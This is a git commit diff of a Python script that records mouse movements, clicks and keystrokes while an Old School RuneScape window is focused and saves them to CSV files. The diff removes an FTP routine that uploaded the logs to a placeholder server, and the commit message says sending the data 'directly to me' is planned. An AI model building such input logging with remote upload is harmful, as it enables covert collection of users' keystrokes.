626f4d28961a25fa3c55ce3833352c97c94a6fa6
papakonnekt <42449974+papakonnekt@users.noreply.github.com>
2023-05-24 23:19:31 -0400

    Update data_collector.py
    working model, just need to add a uploading code, so the data gets sent directly to me.

--- data_collector.py
+++ data_collector.py
@@ -2,15 +2,8 @@ import time
 import csv
 import win32gui
 import math
-import platform
-import subprocess
-import shutil
-import os
-import zipfile
-from pynput.mouse import Listener, Controller
+from pynput.mouse import Listener
 from pynput.keyboard import Listener as KeyboardListener, Key
-from PIL import ImageGrab
-import ftplib
 
 # Global variables
 game_window_titles = ["Old School RuneScape", "Runelite"]  # Update with the actual game window titles
@@ -21,15 +14,7 @@ mouse_positions = []
 mouse_clicks = []
 keyboard_inputs = []
 start_time = time.time()
-
-# Player statistics
-total_actions = 0
-
-# FTP server credentials
-ftp_host = 'ftp.example.com'
-ftp_username = 'your_username'
-ftp_password = 'your_password'
-remote_directory = 'path/to/remote/folder/'
+stop_flag = False  # Flag to stop the script
 
 # Mouse speed calculation variables
 last_mouse_position = None
@@ -53,7 +38,7 @@ def on_move(x, y):
 
     # Calculate mouse speed
     current_time = time.time()
-    if last_mouse_position is not None and last_mouse_time is not None:
+    if last_mouse_position is not None and last_mouse_time is not None and current_time != last_mouse_time:
         distance = math.sqrt((x - last_mouse_position[0])**2 + (y - last_mouse_position[1])**2)
         time_diff = current_time - last_mouse_time
         speed = distance / time_diff
@@ -87,7 +72,7 @@ def on_click(x, y, button, pressed):
 
 # Callback function for keyboard inputs
 def on_press(key):
-    global is_game_open, keyboard_inputs
+    global is_game_open, keyboard_inputs, stop_flag
 
     # Check if the game is open
     if not is_game_open:
@@ -96,80 +81,54 @@ def on_press(key):
 
     # Record keyboard inputs
     if is_game_open:
-        keyboard_inputs.append(key)
+        if key == Key.esc:  # Check if Escape key is pressed
+            print("Stopping...")
+            stop_flag = True
 
-# Callback function for keyboard inputs
-def on_release(key):
-    global is_game_open, keyboard_inputs
-
-    # Check if the game is open
-    if not is_game_open:
-        if any(title in win32gui.GetWindowText(win32gui.GetForegroundWindow()) for title in game_window_titles):
-            is_game_open = True
-
-    # Record keyboard inputs
-    if is_game_open:
         keyboard_inputs.append(key)
 
 # Function to write data to CSV file
 def write_to_csv(data):
-    global remote_directory
-
     # Generate a unique file name using timestamp
     timestamp = time.strftime("%Y%m%d%H%M%S", time.localtime())
     file_name = f"data_{timestamp}.csv"
-    file_path = os.path.join(os.getcwd(), file_name)
-    remote_path = os.path.join(remote_directory, file_name)
+    file_path = file_name
 
     # Open CSV file in write mode
     with open(file_path, "w", newline="") as file:
         writer = csv.writer(file)
         writer.writerow(data)
 
-    return file_path, remote_path
-
-# Function to upload file to FTP server
-def upload_to_ftp(file_path, remote_path):
-    try:
-        with ftplib.FTP(ftp_host) as ftp:
-            ftp.login(ftp_username, ftp_password)
-            with open(file_path, 'rb') as file:
-                ftp.storbinary('STOR ' + remote_path, file)
-            print('File uploaded to FTP server successfully.')
-    except Exception as e:
-        print('Error uploading file to FTP server:', str(e))
+    return file_path
 
 # Main script
 def main():
-    global is_game_open, mouse_positions, mouse_clicks, keyboard_inputs, start_time
+    global is_game_open, mouse_positions, mouse_clicks, keyboard_inputs, start_time, stop_flag
 
     # Set up mouse listener
     mouse_listener = Listener(on_move=on_move, on_click=on_click)
     mouse_listener.start()
 
     # Set up keyboard listener
-    keyboard_listener = KeyboardListener(on_press=on_press, on_release=on_release)
+    keyboard_listener = KeyboardListener(on_press=on_press)
     keyboard_listener.start()
 
     # Wait for the listeners to start
     time.sleep(1)
 
-    while True:
+    while not stop_flag:
         # Check if the game is open
         if not is_game_open:
             if any(title in win32gui.GetWindowText(win32gui.GetForegroundWindow()) for title in game_window_titles):
                 is_game_open = True
 
-        # Check if it's time to send the email (every 1 hour)
+        # Check if it's time to save the data (every 1 minute)
         current_time = time.time()
         elapsed_time = current_time - start_time
-        if elapsed_time >= 3600:  # 1 hour = 60 minutes * 60 seconds = 3600 seconds
+        if elapsed_time >= 60:  # 1 minute = 60 seconds
             # Write data to CSV file
             data = [elapsed_time] + mouse_positions + mouse_clicks + keyboard_inputs
-            file_path, remote_path = write_to_csv(data)
-
-            # Upload CSV file to FTP server
-            upload_to_ftp(file_path, remote_path)
+            file_path = write_to_csv(data)
 
             # Reset variables
             start_time = current_time
@@ -177,7 +136,12 @@ def main():
             mouse_clicks = []
             keyboard_inputs = []
 
+        print("Code is running...", flush=True)  # Print console message and flush the output
+
         time.sleep(1)
+
+    mouse_listener.stop()
+    keyboard_listener.stop()
 
 if __name__ == '__main__':
     main()
